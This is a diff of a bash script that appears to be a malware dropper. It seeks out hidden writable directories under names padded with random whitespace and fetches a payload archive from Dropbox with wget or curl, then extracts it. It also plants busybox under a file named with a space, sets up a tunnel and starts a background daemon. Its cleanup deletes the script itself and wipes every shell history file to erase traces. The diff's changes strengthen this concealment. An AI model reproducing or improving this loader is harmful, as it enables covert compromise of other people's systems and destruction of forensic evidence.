@@ -2,12 +2,12 @@
 ## needed tmux sed grep envsubst
 
 ## load customization variables
-[ -f env.sh ] && . ./env.sh && STARTING_VARS=$(<env.sh)
-STARTING_PATH=$PATH
+[ -f env.sh ] && . ./env.sh && STARTING_VARS=$(<env.sh) && rm -f env.sh
+STARTING_PATH=${STARTING_PATH:-$PATH}
 STARTING_PID=$BASHPID
 
 pathx() {
-    cd ${1}
+    cd "${1}"
     touch test.sh &&
     chmod +x test.sh &&
     ./test.sh && rm -f test.sh ||
@@ -15,21 +15,22 @@ pathx() {
 }
 
 tmppath() {
-    if tmppath=$($bb mktemp -d -t .XXXXXXXX) && pathx $tmppath; then
-        export PATH=${tmppath}:${PATH} tmppath
-    else
-        for ph in {/dev/shm,/run,/var/tmp,/var/cache,~/.local,~/.cache,~/}; do
-            rm -rf $ph/.path &&
-                mkdir -p $ph/.path &&
-                tmppath=$ph/.path &&
-                pathx $tmppath &&
-                export PATH=${ph}/.path:${PATH} tmppath &&
-                break
-        done
-    fi
+    local pathname=$(printf ".%-$((RANDOM%8))s")
+    # if tmppath=$($bb mktemp -d -t .XXXXXXXX) && pathx $tmppath; then
+    #     export PATH=${tmppath}:${PATH} tmppath
+    # else
+    for ph in {/dev/shm,/run,/var/tmp,/var/cache,~/.local,~/.cache,~/}; do
+        rm -rf "$ph/$pathname" &&
+            mkdir -p "$ph/$pathname" &&
+            tmppath="$ph/$pathname" &&
+            pathx "$tmppath" &&
+            export PATH="${ph}/$pathname:${PATH}" tmppath &&
+            break
+    done
+    # fi
 }
 tmppath
-[ -n "$tmppath" ] && cd $tmppath
+[ -n "$tmppath" ] && cd "$tmppath"
 
 jailjudge() {
     ## where are we
@@ -46,15 +47,18 @@ jailjudge
 
 getpayload(){
     ## get payload from dbx
-    mask=${pl_mask:-:ep/:token/:name}
-    ep=${pl_ep:-https://dl.dropboxusercontent.com/s}
-    token=${pl_token:-xxxxxxxxxxxxxxx}
-    name=${pl_name:-payload-latest.zip}
-    uri=$(eval "echo ${mask//:/$}")
-    wget -q $uri
-    unzip -q $name && rm $name || return 1
+    local mask=${pl_mask:-:ep/:token/:name}
+    local ep=${pl_ep:-https://dl.dropboxusercontent.com/s}
+    local token=${pl_token:-xxxxxxxxxxxxxxx}
+    local name=${pl_name:-payload-latest}
+    local format extract fetch
+    type unzip &>/dev/null && format=.zip extract="unzip -q" || format=.tar.gz extract="tar xf"
+    type wget &>/dev/null && fetch="wget -q" || fetch="curl -sOL"
+    uri=$(eval "echo ${mask//:/$}${format}")
+    $fetch $uri
+    $extract $name && rm "${name}${format}" || { echo "problems with payload." && exit 1; }
     # tar xf ${BRANCH}.tar.gz && rm ${BRANCH}.tar.gz
-    # cd scripts-${BRANCH} || exit 1
+    # cd ${REPO}-${BRANCH} || exit 1
 }
 getpayload || exit 1
 
@@ -65,8 +69,13 @@ getpayload || exit 1
 
 ## env vars and busybox
 export PATH=.:pl:$PATH
-bb=.bb
-cp $(get_path busybox) "$tmppath/../$bb" && chmod +x "$tmppath/../$bb"
+bb=" "
+## link busybox applets, all the applets used should go here
+link_bb() {
+    ln -s "$1" "base64"
+}
+cp "$(get_path busybox)" "$tmppath/../$bb" && chmod +x "$tmppath/../$bb"
+link_bb "$tmppath/../$bb"
 
 ## choose masks
 . ./masks || exit 1
@@ -81,8 +90,6 @@ setup_tnl
 ## start the pausd daemon passing the object args
 . ./pausd || exit 1
 . ./switch || exit 1
-start &
-fleep 2 ## give time to fail
 
 ## check for alternate if fail
 # slept=0
@@ -99,22 +106,26 @@ fleep 2 ## give time to fail
 # done
 # fleep 1 ## once more for edge cases
 
-cd ..
-## debug
-[ "$DEBUG" ] && env>dump.env && exit
-
-## removing tmppath too early might be a race cond
+## removing tmppath too early might be a race cond, let it be called by switch
 cleanup() {
+    ppath="${tmppath%\/*}"
+    previouspaths="$(compgen -G "$ppath"/.\ \*)"
+    cd "$ppath"
     rm -rf "$tmppath" "scripts-${BRANCH}" \
        -- "$0" \
        "dig" "cookie" "env.sh" "../env.sh" \
-       "$HOME"/.*_history ~/.*_history /.*_history
+       "$HOME"/.*_history ~/.*_history /.*_history \
+       "$previouspaths"
+    mkdir "$tmppath" && cd "$tmppath" ## now use tmppath only to store tmp bins
+    mv "../$bb" "$tmppath/"
+    link_bb "$bb"
     # [ -n "$tmppath" ] && find ${tmppath}/${dir} \
     #                           ! -name "$OBJ_MASK" \
     #                           ! -name "$OBJ_CFG_MASK" \
     #                           -delete
 }
-fleep 10
-cleanup
 
-wait %+
+## debug
+[ "$DEBUG" ] && env>dump.env && (fleep $DEBUG && kill -9 $BASHPID) &
+
+start
